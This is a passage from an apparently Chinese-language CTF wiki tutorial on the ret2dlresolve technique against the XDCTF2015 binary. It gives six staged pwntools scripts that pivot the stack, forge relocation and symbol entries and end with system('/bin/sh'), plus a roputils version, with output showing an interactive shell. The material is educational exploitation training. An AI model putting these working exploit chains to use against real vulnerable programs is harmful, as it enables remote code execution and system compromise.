iaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabua [...] \" 0 xffffccf4 \u2502+ 0x14 : \" jaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabva [...] \" 0 xffffccf8 \u2502+ 0x18 : \" kaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwa [...] \" 0 xffffccfc \u2502+ 0x1c : \" laabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxa [...] \" \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ trace ] \u2500\u2500\u2500\u2500 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 gef \u27a4 pattern search [!] Syntax pattern search PATTERN [ SIZE ] gef \u27a4 pattern search 0x62616164 [+] Searching ' 0x62616164 ' [+] Found at offset 112 ( little-endian search ) likely stage 1 \u00b6 \u8fd9\u91cc\u6211\u4eec\u7684\u4e3b\u8981\u76ee\u7684\u662f\u63a7\u5236\u7a0b\u5e8f\u6267\u884cwrite\u51fd\u6570\uff0c\u867d\u7136\u6211\u4eec\u53ef\u4ee5\u63a7\u5236\u7a0b\u5e8f\u76f4\u63a5\u6267\u884cwrite\u51fd\u6570\u3002\u4f46\u662f\u8fd9\u91cc\u6211\u4eec\u91c7\u7528\u4e00\u4e2a\u66f4\u52a0\u590d\u6742\u7684\u529e\u6cd5\uff0c\u5373\u4f7f\u7528\u6808\u8fc1\u79fb\u7684\u6280\u5de7\uff0c\u5c06\u6808\u8fc1\u79fb\u5230bss\u6bb5\u6765\u63a7\u5236write\u51fd\u6570\u3002\u5373\u4e3b\u8981\u5206\u4e3a\u4e24\u6b65 \u5c06\u6808\u8fc1\u79fb\u5230bss\u6bb5\u3002 \u63a7\u5236write\u51fd\u6570\u8f93\u51fa\u76f8\u5e94\u5b57\u7b26\u4e32\u3002 \u8fd9\u91cc\u4e3b\u8981\u4f7f\u7528\u4e86pwntools\u4e2d\u7684ROP\u6a21\u5757\u3002\u5177\u4f53\u4ee3\u7801\u5982\u4e0b from pwn import * elf = ELF ( 'main' ) r = process ( './main' ) rop = ROP ( './main' ) offset = 112 bss_addr = elf . bss () r . recvuntil ( 'Welcome to XDCTF2015~! \\n ' ) ## stack pivoting to bss segment ## new stack size is 0x800 stack_size = 0x800 base_stage = bss_addr + stack_size ### padding rop . raw ( 'a' * offset ) ### read 100 byte to base_stage rop . read ( 0 , base_stage , 100 ) ### stack pivoting, set esp = base_stage rop . migrate ( base_stage ) r . sendline ( rop . chain ()) ## write cmd=\"/bin/sh\" rop = ROP ( './main' ) sh = \"/bin/sh\" rop . write ( 1 , base_stage + 80 , len ( sh )) rop . raw ( 'a' * ( 80 - len ( rop . chain ()))) rop . raw ( sh ) rop . raw ( 'a' * ( 100 - len ( rop . chain ()))) r . sendline ( rop . chain ()) r . interactive () \u7ed3\u679c\u5982\u4e0b \u279c ret2dlresolve git: ( master ) \u2717 python stage1.py [ * ] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/ret2dlresolve/main' Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE ( 0x8048000 ) [ + ] Starting local process './main' : pid 120912 [ * ] Loaded cached gadgets for './main' [ * ] Switching to interactive mode /bin/sh [ * ] Got EOF while reading in interactive stage 2 \u00b6 \u5728\u8fd9\u4e00\u9636\u6bb5\uff0c\u6211\u4eec\u5c06\u4f1a\u5229\u7528dlresolve\u76f8\u5173\u7684\u77e5\u8bc6\u6765\u63a7\u5236\u7a0b\u5e8f\u6267\u884cwrite\u51fd\u6570\u3002\u8fd9\u91cc\u6211\u4eec\u4e3b\u8981\u662f\u5229\u7528plt[0]\u4e2d\u7684\u76f8\u5173\u6307\u4ee4\uff0c\u5373push linkmap\u4ee5\u53ca\u8df3\u8f6c\u5230dl_resolve\u51fd\u6570\u4e2d\u89e3\u6790\u7684\u6307\u4ee4\u3002\u6b64\u5916\uff0c\u6211\u4eec\u8fd8\u5f97\u5355\u72ec\u63d0\u4f9b\u4e00\u4e2awrite\u91cd\u5b9a\u4f4d\u9879\u5728plt\u8868\u4e2d\u7684\u504f\u79fb\u3002 from pwn import * elf = ELF ( 'main' ) r = process ( './main' ) rop = ROP ( './main' ) offset = 112 bss_addr = elf . bss () r . recvuntil ( 'Welcome to XDCTF2015~! \\n ' ) ## stack pivoting to bss segment ## new stack size is 0x800 stack_size = 0x800 base_stage = bss_addr + stack_size ### padding rop . raw ( 'a' * offset ) ### read 100 byte to base_stage rop . read ( 0 , base_stage , 100 ) ### stack pivoting, set esp = base_stage rop . migrate ( base_stage ) r . sendline ( rop . chain ()) ## write cmd=\"/bin/sh\" rop = ROP ( './main' ) sh = \"/bin/sh\" plt0 = elf . get_section_by_name ( '.plt' ) . header . sh_addr write_index = ( elf . plt [ 'write' ] - plt0 ) / 16 - 1 write_index *= 8 rop . raw ( plt0 ) rop . raw ( write_index ) ## fake ret addr of write rop . raw ( 'bbbb' ) rop . raw ( 1 ) rop . raw ( base_stage + 80 ) rop . raw ( len ( sh )) rop . raw ( 'a' * ( 80 - len ( rop . chain ()))) rop . raw ( sh ) rop . raw ( 'a' * ( 100 - len ( rop . chain ()))) r . sendline ( rop . chain ()) r . interactive () \u6548\u679c\u5982\u4e0b\uff0c\u4ecd\u7136\u8f93\u51fa\u4e86cmd\u5bf9\u5e94\u7684\u5b57\u7b26\u4e32\u3002 \u279c ret2dlresolve git: ( master ) \u2717 python stage2.py [ * ] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/ret2dlresolve/main' Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE ( 0x8048000 ) [ + ] Starting local process './main' : pid 123406 [ * ] Loaded cached gadgets for './main' [ * ] Switching to interactive mode /bin/sh [ * ] Got EOF while reading in interactive stage 3 \u00b6 \u8fd9\u4e00\u6b21\uff0c\u6211\u4eec\u540c\u6837\u63a7\u5236dl_resolve\u51fd\u6570\u4e2d\u7684index_offset\u53c2\u6570\uff0c\u4e0d\u8fc7\u8fd9\u6b21\u63a7\u5236\u5176\u6307\u5411\u6211\u4eec\u4f2a\u9020\u7684write\u91cd\u5b9a\u4f4d\u9879\u3002 \u9274\u4e8epwntools\u672c\u8eab\u5e76\u4e0d\u652f\u6301\u5bf9\u91cd\u5b9a\u4f4d\u8868\u9879\u7684\u4fe1\u606f\u7684\u83b7\u53d6\u3002\u8fd9\u91cc\u6211\u4eec\u624b\u52a8\u770b\u4e00\u4e0b \u279c ret2dlresolve git: ( master ) \u2717 readelf -r main \u91cd\u5b9a\u4f4d\u8282 '.rel.dyn' \u4f4d\u4e8e\u504f\u79fb\u91cf 0x318 \u542b\u6709 3 \u4e2a\u6761\u76ee\uff1a \u504f\u79fb\u91cf \u4fe1\u606f \u7c7b\u578b \u7b26\u53f7\u503c \u7b26\u53f7\u540d\u79f0 08049ffc 00000306 R_386_GLOB_DAT 00000000 __gmon_start__ 0804a040 00000905 R_386_COPY 0804a040 stdin@GLIBC_2.0 0804a044 00000705 R_386_COPY 0804a044 stdout@GLIBC_2.0 \u91cd\u5b9a\u4f4d\u8282 '.rel.plt' \u4f4d\u4e8e\u504f\u79fb\u91cf 0x330 \u542b\u6709 5 \u4e2a\u6761\u76ee\uff1a \u504f\u79fb\u91cf \u4fe1\u606f \u7c7b\u578b \u7b26\u53f7\u503c \u7b26\u53f7\u540d\u79f0 0804a00c 00000107 R_386_JUMP_SLOT 00000000 setbuf@GLIBC_2.0 0804a010 00000207 R_386_JUMP_SLOT 00000000 read@GLIBC_2.0 0804a014 00000407 R_386_JUMP_SLOT 00000000 strlen@GLIBC_2.0 0804a018 00000507 R_386_JUMP_SLOT 00000000 __libc_start_main@GLIBC_2.0 0804a01c 00000607 R_386_JUMP_SLOT 00000000 write@GLIBC_2.0 \u53ef\u4ee5\u770b\u51fawrite\u7684\u91cd\u5b9a\u8868\u9879\u7684r_offset=0x0804a01c\uff0cr_info=0x00000607\u3002\u5177\u4f53\u4ee3\u7801\u5982\u4e0b from pwn import * elf = ELF ( 'main' ) r = process ( './main' ) rop = ROP ( './main' ) offset = 112 bss_addr = elf . bss () r . recvuntil ( 'Welcome to XDCTF2015~! \\n ' ) ## stack pivoting to bss segment ## new stack size is 0x800 stack_size = 0x800 base_stage = bss_addr + stack_size ### padding rop . raw ( 'a' * offset ) ### read 100 byte to base_stage rop . read ( 0 , base_stage , 100 ) ### stack pivoting, set esp = base_stage rop . migrate ( base_stage ) r . sendline ( rop . chain ()) ## write sh=\"/bin/sh\" rop = ROP ( './main' ) sh = \"/bin/sh\" plt0 = elf . get_section_by_name ( '.plt' ) . header . sh_addr rel_plt = elf . get_section_by_name ( '.rel.plt' ) . header . sh_addr ## making base_stage+24 ---> fake reloc index_offset = base_stage + 24 - rel_plt write_got = elf . got [ 'write' ] r_info = 0x607 rop . raw ( plt0 ) rop . raw ( index_offset ) ## fake ret addr of write rop . raw ( 'bbbb' ) rop . raw ( 1 ) rop . raw ( base_stage + 80 ) rop . raw ( len ( sh )) rop . raw ( write_got ) # fake reloc rop . raw ( r_info ) rop . raw ( 'a' * ( 80 - len ( rop . chain ()))) rop . raw ( sh ) rop . raw ( 'a' * ( 100 - len ( rop . chain ()))) r . sendline ( rop . chain ()) r . interactive () \u6700\u540e\u7ed3\u679c\u5982\u4e0b\uff0c\u8fd9\u6b21\u6211\u4eec\u5728bss\u6bb5\u4f2a\u9020\u4e86\u4e00\u4e2a\u5047\u7684write\u7684\u91cd\u5b9a\u4f4d\u9879\uff0c\u4ecd\u7136\u8f93\u51fa\u4e86\u5bf9\u5e94\u7684\u5b57\u7b26\u4e32\u3002 \u279c ret2dlresolve git: ( master ) \u2717 python stage3.py [ * ] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/ret2dlresolve/main' Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE ( 0x8048000 ) [ + ] Starting local process './main' : pid 126063 [ * ] Loaded cached gadgets for './main' [ * ] Switching to interactive mode /bin/sh [ * ] Got EOF while reading in interactive stage 4 \u00b6 stage3\u4e2d\uff0c\u6211\u4eec\u63a7\u5236\u4e86\u91cd\u5b9a\u4f4d\u8868\u9879\uff0c\u4f46\u662f\u91cd\u5b9a\u4f4d\u8868\u9879\u7684\u5185\u5bb9\u4e0ewrite\u539f\u6765\u7684\u91cd\u5b9a\u4f4d\u8868\u9879\u4e00\u81f4\uff0c\u8fd9\u6b21\uff0c\u6211\u4eec\u5c06\u6784\u9020\u5c5e\u4e8e\u6211\u4eec\u81ea\u5df1\u7684\u91cd\u5b9a\u4f4d\u8868\u9879\uff0c\u5e76\u4e14\u4f2a\u9020\u8be5\u8868\u9879\u5bf9\u5e94\u7684\u7b26\u53f7\u3002\u9996\u5148\uff0c\u6211\u4eec\u6839\u636ewrite\u7684\u91cd\u5b9a\u4f4d\u8868\u9879\u7684r_info=0x607\u53ef\u4ee5\u77e5\u9053\uff0cwrite\u5bf9\u5e94\u7684\u7b26\u53f7\u5728\u7b26\u53f7\u8868\u7684\u4e0b\u6807\u4e3a0x607>>8=0x6\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u77e5\u9053write\u5bf9\u5e94\u7684\u7b26\u53f7\u5730\u5740\u4e3a0x8048238\u3002 \u279c ret2dlresolve git: ( master ) \u2717 objdump -s -EL -j .dynsym main main\uff1a \u6587\u4ef6\u683c\u5f0f elf32-i386 Contents of section .dynsym: 80481d8 00000000 00000000 00000000 00000000 ................ 80481e8 33000000 00000000 00000000 12000000 3 ............... 80481f8 27000000 00000000 00000000 12000000 ' ............... 8048208 52000000 00000000 00000000 20000000 R........... ... 8048218 20000000 00000000 00000000 12000000 ............... 8048228 3a000000 00000000 00000000 12000000 :............... 8048238 4c000000 00000000 00000000 12000000 L............... 8048248 2c000000 44a00408 04000000 11001a00 ,...D........... 8048258 0b000000 3c860408 04000000 11001000 ....<........... 8048268 1a000000 40a00408 04000000 11001a00 ....@........... \u8fd9\u91cc\u7ed9\u51fa\u7684\u5176\u5b9e\u662f\u5c0f\u7aef\u6a21\u5f0f\uff0c\u56e0\u6b64\u6211\u4eec\u9700\u8981\u624b\u5de5\u8f6c\u6362\u3002\u6b64\u5916\uff0c\u6bcf\u4e2a\u7b26\u53f7\u5360\u7528\u7684\u5927\u5c0f\u4e3a16\u4e2a\u5b57\u8282\u3002 from pwn import * elf = ELF ( 'main' ) r = process ( './main' ) rop = ROP ( './main' ) offset = 112 bss_addr = elf . bss () r . recvuntil ( 'Welcome to XDCTF2015~! \\n ' ) ## stack pivoting to bss segment ## new stack size is 0x800 stack_size = 0x800 base_stage = bss_addr + stack_size ### padding rop . raw ( 'a' * offset ) ### read 100 byte to base_stage rop . read ( 0 , base_stage , 100 ) ### stack pivoting, set esp = base_stage rop . migrate ( base_stage ) r . sendline ( rop . chain ()) ## write sh=\"/bin/sh\" rop = ROP ( './main' ) sh = \"/bin/sh\" plt0 = elf . get_section_by_name ( '.plt' ) . header . sh_addr rel_plt = elf . get_section_by_name ( '.rel.plt' ) . header . sh_addr dynsym = elf . get_section_by_name ( '.dynsym' ) . header . sh_addr dynstr = elf . get_section_by_name ( '.dynstr' ) . header . sh_addr ### making fake write symbol fake_sym_addr = base_stage + 32 align = 0x10 - (( fake_sym_addr - dynsym ) & 0xf ) # since the size of item(Elf32_Symbol) of dynsym is 0x10 fake_sym_addr = fake_sym_addr + align index_dynsym = ( fake_sym_addr - dynsym ) / 0x10 # calculate the dynsym index of write fake_write_sym = flat ([ 0x4c , 0 , 0 , 0x12 ]) ### making fake write relocation ## making base_stage+24 ---> fake reloc index_offset = base_stage + 24 - rel_plt write_got = elf . got [ 'write' ] r_info = ( index_dynsym << 8 ) | 0x7 fake_write_reloc = flat ([ write_got , r_info ]) rop . raw ( plt0 ) rop . raw ( index_offset ) ## fake ret addr of write rop . raw ( 'bbbb' ) rop . raw ( 1 ) rop . raw ( base_stage + 80 ) rop . raw ( len ( sh )) rop . raw ( fake_write_reloc ) # fake write reloc rop . raw ( 'a' * align ) # padding rop . raw ( fake_write_sym ) # fake write symbol rop . raw ( 'a' * ( 80 - len ( rop . chain ()))) rop . raw ( sh ) rop . raw ( 'a' * ( 100 - len ( rop . chain ()))) r . sendline ( rop . chain ()) r . interactive () \u5177\u4f53\u6548\u679c\u5982\u4e0b \u279c ret2dlresolve git: ( master ) \u2717 python stage4.py [ * ] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/ret2dlresolve/main' Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE ( 0x8048000 ) [ + ] Starting local process './main' : pid 128795 [ * ] Loaded cached gadgets for './main' [ * ] Switching to interactive mode /bin/sh [ * ] Got EOF while reading in interactive stage 5 \u00b6 \u8fd9\u4e00\u9636\u6bb5\uff0c\u6211\u4eec\u5c06\u5728\u9636\u6bb54\u7684\u57fa\u7840\u4e0a\uff0c\u6211\u4eec\u8fdb\u4e00\u6b65\u4f7f\u5f97write\u7b26\u53f7\u7684st_name\u6307\u5411\u6211\u4eec\u81ea\u5df1\u6784\u9020\u7684\u5b57\u7b26\u4e32\u3002 from pwn import * elf = ELF ( 'main' ) r = process ( './main' ) rop = ROP ( './main' ) offset = 112 bss_addr = elf . bss () r . recvuntil ( 'Welcome to XDCTF2015~! \\n ' ) ## stack pivoting to bss segment ## new stack size is 0x800 stack_size = 0x800 base_stage = bss_addr + stack_size ### padding rop . raw ( 'a' * offset ) ### read 100 byte to base_stage rop . read ( 0 , base_stage , 100 ) ### stack pivoting, set esp = base_stage rop . migrate ( base_stage ) r . sendline ( rop . chain ()) ## write sh=\"/bin/sh\" rop = ROP ( './main' ) sh = \"/bin/sh\" plt0 = elf . get_section_by_name ( '.plt' ) . header . sh_addr rel_plt = elf . get_section_by_name ( '.rel.plt' ) . header . sh_addr dynsym = elf . get_section_by_name ( '.dynsym' ) . header . sh_addr dynstr = elf . get_section_by_name ( '.dynstr' ) . header . sh_addr ### making fake write symbol fake_sym_addr = base_stage + 32 align = 0x10 - (( fake_sym_addr - dynsym ) & 0xf ) # since the size of item(Elf32_Symbol) of dynsym is 0x10 fake_sym_addr = fake_sym_addr + align index_dynsym = ( fake_sym_addr - dynsym ) / 0x10 # calculate the dynsym index of write ## plus 10 since the size of Elf32_Sym is 16. st_name = fake_sym_addr + 0x10 - dynstr fake_write_sym = flat ([ st_name , 0 , 0 , 0x12 ]) ### making fake write relocation ## making base_stage+24 ---> fake reloc index_offset = base_stage + 24 - rel_plt write_got = elf . got [ 'write' ] r_info = ( index_dynsym << 8 ) | 0x7 fake_write_reloc = flat ([ write_got , r_info ]) rop . raw ( plt0 ) rop . raw ( index_offset ) ## fake ret addr of write rop . raw ( 'bbbb' ) rop . raw ( 1 ) rop . raw ( base_stage + 80 ) rop . raw ( len ( sh )) rop . raw ( fake_write_reloc ) # fake write reloc rop . raw ( 'a' * align ) # padding rop . raw ( fake_write_sym ) # fake write symbol rop . raw ( 'write \\x00 ' ) # there must be a \\x00 to mark the end of string rop . raw ( 'a' * ( 80 - len ( rop . chain ()))) rop . raw ( sh ) rop . raw ( 'a' * ( 100 - len ( rop . chain ()))) r . sendline ( rop . chain ()) r . interactive () \u6548\u679c\u5982\u4e0b \u279c ret2dlresolve git: ( master ) \u2717 python stage5.py [ * ] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/ret2dlresolve/main' Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE ( 0x8048000 ) [ + ] Starting local process './main' : pid 129249 [ * ] Loaded cached gadgets for './main' [ * ] Switching to interactive mode /bin/sh [ * ] Got EOF while reading in interactive stage 6 \u00b6 \u8fd9\u4e00\u9636\u6bb5\uff0c\u6211\u4eec\u53ea\u9700\u8981\u5c06\u539f\u5148\u7684write\u5b57\u7b26\u4e32\u4fee\u6539\u4e3asystem\u5b57\u7b26\u4e32\uff0c\u540c\u65f6\u4fee\u6539write\u7684\u53c2\u6570\u4e3asystem\u7684\u53c2\u6570\u5373\u53ef\u83b7\u53d6shell\u3002\u8fd9\u662f\u56e0\u4e3a\uff0cdl_resolve\u6700\u7ec8\u4f9d\u8d56\u7684\u662f\u6211\u4eec\u6240\u7ed9\u5b9a\u7684\u5b57\u7b26\u4e32\uff0c\u5373\u4f7f\u6211\u4eec\u7ed9\u4e86\u4e00\u4e2a\u5047\u7684\u5b57\u7b26\u4e32\u5b83\u4ecd\u7136\u4f1a\u53bb\u89e3\u6790\u5e76\u6267\u884c\u3002\u5177\u4f53\u4ee3\u7801\u5982\u4e0b from pwn import * elf = ELF ( 'main' ) r = process ( './main' ) rop = ROP ( './main' ) offset = 112 bss_addr = elf . bss () r . recvuntil ( 'Welcome to XDCTF2015~! \\n ' ) ## stack pivoting to bss segment ## new stack size is 0x800 stack_size = 0x800 base_stage = bss_addr + stack_size ### padding rop . raw ( 'a' * offset ) ### read 100 byte to base_stage rop . read ( 0 , base_stage , 100 ) ### stack pivoting, set esp = base_stage rop . migrate ( base_stage ) r . sendline ( rop . chain ()) ## write sh=\"/bin/sh\" rop = ROP ( './main' ) sh = \"/bin/sh\" plt0 = elf . get_section_by_name ( '.plt' ) . header . sh_addr rel_plt = elf . get_section_by_name ( '.rel.plt' ) . header . sh_addr dynsym = elf . get_section_by_name ( '.dynsym' ) . header . sh_addr dynstr = elf . get_section_by_name ( '.dynstr' ) . header . sh_addr ### making fake write symbol fake_sym_addr = base_stage + 32 align = 0x10 - (( fake_sym_addr - dynsym ) & 0xf ) # since the size of item(Elf32_Symbol) of dynsym is 0x10 fake_sym_addr = fake_sym_addr + align index_dynsym = ( fake_sym_addr - dynsym ) / 0x10 # calculate the dynsym index of write ## plus 10 since the size of Elf32_Sym is 16. st_name = fake_sym_addr + 0x10 - dynstr fake_write_sym = flat ([ st_name , 0 , 0 , 0x12 ]) ### making fake write relocation ## making base_stage+24 ---> fake reloc index_offset = base_stage + 24 - rel_plt write_got = elf . got [ 'write' ] r_info = ( index_dynsym << 8 ) | 0x7 fake_write_reloc = flat ([ write_got , r_info ]) rop . raw ( plt0 ) rop . raw ( index_offset ) ## fake ret addr of write rop . raw ( 'bbbb' ) rop . raw ( base_stage + 82 ) rop . raw ( 'bbbb' ) rop . raw ( 'bbbb' ) rop . raw ( fake_write_reloc ) # fake write reloc rop . raw ( 'a' * align ) # padding rop . raw ( fake_write_sym ) # fake write symbol rop . raw ( 'system \\x00 ' ) # there must be a \\x00 to mark the end of string rop . raw ( 'a' * ( 80 - len ( rop . chain ()))) print rop . dump () print len ( rop . chain ()) rop . raw ( sh + ' \\x00 ' ) rop . raw ( 'a' * ( 100 - len ( rop . chain ()))) r . sendline ( rop . chain ()) r . interactive () \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8fd9\u91cc\u6211'/bin/sh'\u7684\u504f\u79fb\u6211\u4fee\u6539\u4e3a\u4e8682\uff0c\u8fd9\u662f\u56e0\u4e3apwntools\u4e2d\u5b83\u4f1a\u81ea\u52a8\u5e2e\u4f60\u5bf9\u9f50\u5b57\u7b26\u4e32\u3002\u3002\u3002\u4e0b\u9762\u8fd9\u4e00\u884c\u8bf4\u660e\u4e86\u95ee\u9898\u3002 0x0050: 'aara' \u6548\u679c\u5982\u4e0b \u279c ret2dlresolve git: ( master ) \u2717 python stage6.py [ * ] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/ret2dlresolve/main' Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE ( 0x8048000 ) [ + ] Starting local process './main' : pid 130415 [ * ] Loaded cached gadgets for './main' 0x0000: 0x8048380 0x0004: 0x2528 0x0008: 'bbbb' 'bbbb' 0x000c: 0x804a892 0x0010: 'bbbb' 'bbbb' 0x0014: 'bbbb' 'bbbb' 0x0018: '\\x1c\\xa0\\x04\\x08' '\\x1c\\xa0\\x04\\x08\\x07i\\x02\\x00' 0x001c: '\\x07i\\x02\\x00' 0x0020: 'aaaa' 'aaaaaaaa' 0x0024: 'aaaa' 0x0028: '\\x00&\\x00\\x00' '\\x00&\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x12\\x00\\x00\\x00' 0x002c: '\\x00\\x00\\x00\\x00' 0x0030: '\\x00\\x00\\x00\\x00' 0x0034: '\\x12\\x00\\x00\\x00' 0x0038: 'syst' 'system\\x00' 0x003c: 'em\\x00o' 0x0040: 'aa' 0x0044: 'aaaa' 'aaaaaaaaaaaaaa' 0x0048: 'aaaa' 0x004c: 'aaaa' 0x0050: 'aara' 82 [ * ] Switching to interactive mode /bin/sh: 1 : xa: not found $ ls core main.c stage2.py stage4.py stage6.py main stage1.py stage3.py stage5.py \u5de5\u5177\u653b\u51fb \u00b6 \u6839\u636e\u4e0a\u9762\u7684\u4ecb\u7ecd\uff0c\u6211\u4eec\u5e94\u8be5\u5f88\u5bb9\u6613\u53ef\u4ee5\u7406\u89e3\u8fd9\u4e2a\u653b\u51fb\u4e86\u3002\u4e0b\u9762\u6211\u4eec\u76f4\u63a5\u4f7f\u7528roputil\u6765\u8fdb\u884c\u653b\u51fb\u3002\u4ee3\u7801\u5982\u4e0b from roputils import * from pwn import process from pwn import gdb from pwn import context r = process ( './main' ) context . log_level = 'debug' r . recv () rop = ROP ( './main' ) offset = 112 bss_base = rop . section ( '.bss' ) buf = rop . fill ( offset ) buf += rop . call ( 'read' , 0 , bss_base , 100 ) ## used to call dl_Resolve() buf += rop . dl_resolve_call ( bss_base + 20 , bss_base ) r . send ( buf ) buf = rop . string ( '/bin/sh' ) buf += rop . fill ( 20 , buf ) ## used to make faking data, such relocation, Symbol, Str buf += rop . dl_resolve_data ( bss_base + 20 , 'system' ) buf += rop . fill ( 100 , buf ) r . send ( buf ) r . interactive () \u5173\u4e8edl_resolve_call\u4e0edl_resolve_data\u7684\u5177\u4f53\u7ec6\u8282\u8bf7\u53c2\u8003roputils.py\u7684\u6e90\u7801\uff0c\u6bd4\u8f83\u5bb9\u6613\u7406\u89e3\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0cdl_resolve\u6267\u884c\u5b8c\u4e4b\u540e\u4e5f\u662f\u9700\u8981\u6709\u5bf9\u5e94\u7684\u8fd4\u56de\u5730\u5740\u7684\u3002 \u6548\u679c\u5982\u4e0b \u279c ret2dlresolve git: ( master ) \u2717 python roptool.py [ + ] Starting local process './main' : pid 6114 [ DEBUG ] Received 0x17 bytes: 'Welcome to XDCTF2015~!\\n' [ DEBUG ] Sent 0x94 bytes: 00000000 46 4c 68 78 52 36 67 6e 65 47 53 58 71 77 51 49 \u2502FLhx\u2502R6gn\u2502eGSX\u2502qwQI\u2502 00000010 32 43 6c 49 77 76 51 33 47 49 4a 59 50 74 6c 38 \u25022ClI\u2502wvQ3\u2502GIJY\u2502Ptl8\u2502 00000020 57 54 68 4a 63 48 39 62 46 55 52 58 50 73 38 64 \u2502WThJ\u2502cH9b\u2502FURX\u2502Ps8d\u2502 00000030 72 4c 38 63 50 79 37 73 55 45 7a 32 6f 59 5a 42 \u2502rL8c\u2502Py7s\u2502UEz2\u2502oYZB\u2502 00000040 76 59 32 43 74 75 77 6f 70 56 61 44 6a 73 35 6b \u2502vY2C\u2502tuwo\u2502pVaD\u2502js5k\u2502 00000050 41 77 78 77 49 72 7a 49 70 4d 31 67 52 6f 44 6f \u2502Awxw\u2502IrzI\u2502pM1g\u2502RoDo\u2502 00000060 43 44 43 6e 45 31 50 48 53 73 64 30 6d 54 7a 5a \u2502CDCn\u2502E1PH\u2502Ssd0\u2502mTzZ\u2502 00000070 a0 83 04 08 19 86 04 08 00 00 00 00 40 a0 04 08 \u2502\u00b7\u00b7\u00b7\u00b7\u2502\u00b7\u00b7\u00b7\u00b7\u2502\u00b7\u00b7\u00b7\u00b7\u2502@\u00b7\u00b7\u00b7\u2502 00000080 64 00 00 00 80 83 04 08 28 1d 00 00 79 83 04 08 \u2502d\u00b7\u00b7\u00b7\u2502\u00b7\u00b7\u00b7\u00b7\u2502 ( \u00b7\u00b7\u00b7\u2502y\u00b7\u00b7\u00b7\u2502 00000090 40 a0 04 08 \u2502@\u00b7\u00b7\u00b7\u2502\u2502 00000094 [ DEBUG ] Sent 0x64 bytes: 00000000 2f 62 69 6e 2f 73 68 00 73 52 46 66 57 43 59 52 \u2502/bin\u2502/sh\u00b7\u2502sRFf\u2502WCYR\u2502 00000010 66 4c 35 52 78 49 4c 53 54 a0 04 08 07 e9 01 00 \u2502fL5R\u2502xILS\u2502T\u00b7\u00b7\u00b7\u2502\u00b7\u00b7\u00b7\u00b7\u2502 